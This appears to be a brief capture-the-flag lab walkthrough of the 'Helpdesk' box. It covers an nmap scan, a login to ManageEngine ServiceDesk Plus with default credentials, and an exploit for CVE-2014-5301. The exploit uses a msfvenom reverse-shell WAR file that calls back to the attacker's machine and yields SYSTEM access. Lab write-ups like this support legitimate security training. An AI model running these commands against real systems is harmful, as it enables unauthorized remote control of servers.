# PG Helpdesk
## ManageEngine ServiceDesk plus
```
nmap:
sudo nmap 192.168.214.43 -p- -sS -sV                                                                                                                                                                                             130 ⨯

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```
## 8080 ManageEngine Directory Traversal
```
Port 8080 takes us on a login page for ManageEngine ServiceDesk plus.
Running version 7.6.0
Default credentials on Google shows we can try administrator:admininistrator. Successful and are able to login.

Researching exploits for this particular version we come across CVE-2014-5301.
Directory traversal vulnerability in ServiceDesk Plus MSP v5 to v9.0 v9030; AssetExplorer v4 to v6.1; SupportCenter v5 to v7.9; IT360 v8 to v10.4.
https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py
```
## shell.war
```
As per the exploit instructions contained in the script generate a WAR file with msfvenom:
msfvenom -p java/shell_reverse_tcp LHOST=tun0 LPORT=445 -f war > /home/kali/Desktop/shell.war

Then execute with the following syntax:
# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
 sudo python3 exploit.py 192.168.214.x 8080 administrator administrator shell.war

A shell should be received on a netcat listener running as SYSTEM.
```
